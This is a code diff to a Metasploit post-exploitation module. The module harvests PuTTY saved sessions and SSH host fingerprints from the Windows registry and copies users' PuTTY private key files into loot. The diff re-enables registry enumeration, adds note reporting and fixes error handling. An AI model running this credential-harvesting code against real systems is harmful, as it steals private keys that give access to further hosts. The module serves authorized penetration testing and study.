@@ -43,6 +43,7 @@ class Metasploit3 < Msf::Post
             newses[key] = registry_getvaldata("HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\\#{ses}", key).to_s
         end
         all_sessions << newses
+        report_note(host: target_host, type: "putty.savedsession", data: newses)
     end 
     all_sessions
   end
@@ -104,6 +105,7 @@ class Metasploit3 < Msf::Post
             all_ssh_host_keys[host_port] = [] if all_ssh_host_keys[host_port].nil?
             all_ssh_host_keys[host_port] << newkey['type']
         end
+        report_note(host: target_host, type: "putty.storedhostfp", data: newkey)
     end 
     all_ssh_host_keys
   end
@@ -130,13 +132,18 @@ class Metasploit3 < Msf::Post
 
   def grab_private_keys(sessions)
     sessions.each do |ses|
+
         filename = ses['PublicKeyFile'].to_s
         next if filename.empty?
 
+        # Check whether the file exists.
         if file?(filename)
-           ppk = read_file(filename) 
-           stored_path = store_loot('putty.ppk.file', 'text/plain', session, ppk)
-           print_status("PuTTY private key file for \'#{ses['Name']}\' (#{filename}) saved to: #{stored_path}")
+           if ppk = read_file(filename) # Attempt to read the contents of the file
+                stored_path = store_loot('putty.ppk.file', 'application/octet-stream', session, ppk)
+                print_status("PuTTY private key file for \'#{ses['Name']}\' (#{filename}) saved to: #{stored_path}")
+           else
+                print_error("Unable to read PuTTY private key file for \'#{ses['Name']}\' (#{filename})") # May be that we do not have permissions etc
+           end
         else
            print_error("PuTTY private key file for \'#{ses['Name']}\' (#{filename}) could not be found.")
         end
@@ -149,8 +156,7 @@ class Metasploit3 < Msf::Post
 
     # Look for saved sessions, break out if not.
     print_status("Looking for saved PuTTY sessions")
-    #saved_sessions = registry_enumkeys('HKCU\\Software\\SimonTatham\\PuTTY\\Sessions')
-    saved_sessions = nil
+    saved_sessions = registry_enumkeys('HKCU\\Software\\SimonTatham\\PuTTY\\Sessions')
     if saved_sessions.nil? || saved_sessions.empty?
         print_error('No saved sessions found')
     else
@@ -161,6 +167,7 @@ class Metasploit3 < Msf::Post
 	    # Retrieve the saved session details & print them to the screen in a report
 	    all_saved_sessions = get_saved_session_details(saved_sessions)
 	    display_saved_sessions_report(all_saved_sessions)
+    	print_status("Session data also stored in notes. Use 'notes -t putty.savedsessions to view'.")
 	
 	    # If the private key file has been configured, retrieve it and save it to loot
 	    print_status("Downloading private keys...")
@@ -182,10 +189,10 @@ class Metasploit3 < Msf::Post
 	    print_status("Downloading stored key fingerprints...")
 	    all_stored_keys = get_stored_host_key_details(stored_ssh_host_keys)
         if all_stored_keys.nil? || all_stored_keys.empty?
-    	    print_status("Unique host:port pairs are shown in the table below. All other details, including the actual fingerprint, are stored in notes (putty.ssh.fingerprint)")
-            display_stored_host_keys_report(all_stored_keys) 
-        else
             print_error("No stored key fingerprints found")
+        else
+    	    print_status("Unique host:port pairs are shown in the table below. All other details, including the actual fingerprint, are stored in notes. Use 'notes -t putty.storedhostfp to view'.")
+            display_stored_host_keys_report(all_stored_keys) 
         end
     end
 
